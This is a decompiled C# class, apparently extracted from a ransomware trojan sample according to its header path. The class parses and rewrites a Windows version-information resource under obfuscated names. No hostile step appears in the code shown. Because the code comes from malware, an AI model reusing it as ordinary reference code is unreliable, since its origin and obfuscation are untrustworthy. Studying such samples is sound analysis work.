// Decompiled with JetBrains decompiler
// Type: ns1.Class1
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: AA83BB74-0A66-4BAC-8184-D7E3DA7EFE4C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-26680280de8156494a34717623fa44dd8b6e6c766697b964f261c09185d29443.exe

using ns0;
using ns2;
using ns3;
using ns5;
using ns7;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace ns1
{
  internal sealed class Class1 : Class0
  {
    private Class20 class20_0 = new Class20("VS_VERSION_INFO");
    private Class41 class41_0 = new Class41();
    private Dictionary<string, Class20> dictionary_0 = new Dictionary<string, Class20>();

    [SpecialName]
    public Dictionary<string, Class20> method_4() => this.dictionary_0;

    public Class1(
      IntPtr intptr_2,
      IntPtr intptr_3,
      Class40 class40_2,
      Class40 class40_3,
      ushort ushort_1,
      int int_1)
      : base(intptr_2, intptr_3, class40_2, class40_3, ushort_1, int_1)
    {
    }

    public Class1()
      : base(IntPtr.Zero, IntPtr.Zero, new Class40(Class38.Enum6.const_13), new Class40(1U), Class15.smethod_8(), 0)
    {
      this.class20_0.method_2(new Class38.Struct2(this.class41_0.method_6()));
    }

    internal override IntPtr vmethod_0(IntPtr intptr_2, IntPtr intptr_3)
    {
      this.dictionary_0.Clear();
      IntPtr intptr_0_1 = this.class20_0.vmethod_0(intptr_3);
      if (this.class20_0.method_1().ushort_1 != (ushort) 0)
      {
        this.class41_0 = new Class41();
        this.class41_0.method_1(intptr_0_1);
      }
      Class20 class20;
      for (IntPtr intptr_0_2 = Class15.smethod_0(intptr_0_1.ToInt32() + (int) this.class20_0.method_1().ushort_1); intptr_0_2.ToInt32() < intptr_3.ToInt32() + (int) this.class20_0.method_1().ushort_0; intptr_0_2 = Class15.smethod_0(intptr_0_2.ToInt32() + (int) class20.method_1().ushort_0))
      {
        switch (new Class20(intptr_0_2).method_0())
        {
          case "StringFileInfo":
            class20 = (Class20) new Class22(intptr_0_2);
            break;
          default:
            class20 = (Class20) new Class24(intptr_0_2);
            break;
        }
        this.dictionary_0.Add(class20.method_0(), class20);
      }
      return new IntPtr(intptr_3.ToInt32() + (int) this.class20_0.method_1().ushort_0);
    }

    [SpecialName]
    public void method_5(string string_0) => this.class41_0.method_2(string_0);

    [SpecialName]
    public string method_6() => this.class41_0.method_3();

    [SpecialName]
    public void method_7(string string_0) => this.class41_0.method_4(string_0);

    [SpecialName]
    public Class41 method_8() => this.class41_0;

    internal override void vmethod_1(BinaryWriter binaryWriter_0)
    {
      long position = binaryWriter_0.BaseStream.Position;
      this.class20_0.vmethod_1(binaryWriter_0);
      if (this.class41_0 != null)
        this.class41_0.method_5(binaryWriter_0);
      Dictionary<string, Class20>.Enumerator enumerator = this.dictionary_0.GetEnumerator();
      while (enumerator.MoveNext())
        enumerator.Current.Value.vmethod_1(binaryWriter_0);
      Class15.smethod_5(binaryWriter_0, binaryWriter_0.BaseStream.Position - position, position);
    }

    public Class20 this[string string_0]
    {
      get => this.method_4()[string_0];
      set => this.method_4()[string_0] = value;
    }

    string object.ToString()
    {
      StringBuilder stringBuilder = new StringBuilder();
      if (this.class41_0 != null)
        stringBuilder.Append(((object) this.class41_0).ToString());
      stringBuilder.AppendLine("BEGIN");
      Dictionary<string, Class20>.Enumerator enumerator = this.dictionary_0.GetEnumerator();
      while (enumerator.MoveNext())
        stringBuilder.Append(enumerator.Current.Value.vmethod_2(1));
      stringBuilder.AppendLine("END");
      return stringBuilder.ToString();
    }
  }
}
